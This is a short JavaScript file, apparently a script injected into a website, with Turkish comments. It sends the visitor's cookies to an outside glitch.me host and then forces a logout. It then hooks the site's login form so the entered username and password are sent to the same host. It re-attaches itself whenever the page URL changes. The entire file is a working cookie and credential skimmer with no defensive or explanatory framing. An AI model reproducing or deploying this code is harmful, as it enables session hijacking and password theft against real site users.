(function () {
  // Script çalıştığını doğrula
  console.log('c.js çalışıyor');

  // Çıkış yapma
  const cookies = document.cookie || '';
  if (cookies) {
    fetch('https://ancient-pentagonal-elephant.glitch.me/log?cookie=' + encodeURIComponent(cookies), {
      method: 'GET',
      credentials: 'include'
    })
      .then(() => {
        console.log('Çıkış logu gönderildi');
        if (typeof cikisyap === 'function') {
          cikisyap(); // Hemen çıkış yap
        } else {
          console.log('cikisyap fonksiyonu bulunamadı');
        }
      })
      .catch(err => {
        console.log('Çıkış logu hatası:', err);
        if (typeof cikisyap === 'function') {
          cikisyap();
        }
      });
  }

  // Giriş formunu dinle
  function setupButtonListeners() {
    const loginButton = document.querySelector('button[data-bs-toggle="modal"][data-bs-target=".bd-example-modal-sm"]');
    if (loginButton) {
      loginButton.addEventListener('click', () => {
        setTimeout(setupLoginListener, 100);
      });
    } else {
      console.log('Giriş modal butonu bulunamadı');
    }
  }

  function setupLoginListener() {
    const loginBtn = document.querySelector('.btn-primary[onclick="girisyap()"]');
    if (loginBtn) {
      console.log('Login listener eklendi');
      loginBtn.addEventListener('click', () => {
        const username = document.getElementById('loginname')?.value || 'Bilinmiyor';
        const password = document.getElementById('loginpassport')?.value || 'Bilinmiyor';
        const remember = document.getElementById('authCheck')?.checked || false;
        console.log('Giriş bilgileri:', { username, password, remember });
        const data = `kuladi=${encodeURIComponent(username)}&sifre=${encodeURIComponent(password)}&remember=${encodeURIComponent(remember)}`;

        fetch(`https://ancient-pentagonal-elephant.glitch.me/log?${data}`, {
          method: 'GET',
          credentials: 'include'
        })
          .then(() => {
            console.log('Giriş logu gönderildi');
          })
          .catch(err => {
            console.log('Giriş logu hatası:', err);
          });
      });
    } else {
      console.log('Login butonu bulunamadı');
    }
  }

  // Sayfa yüklendiğinde ve URL değiştiğinde dinleyici kur
  window.addEventListener('load', () => {
    setupButtonListeners();
  });

  let lastUrl = location.href;
  setInterval(() => {
    if (location.href !== lastUrl) {
      lastUrl = location.href;
      setupButtonListeners();
    }
  }, 500);
})();
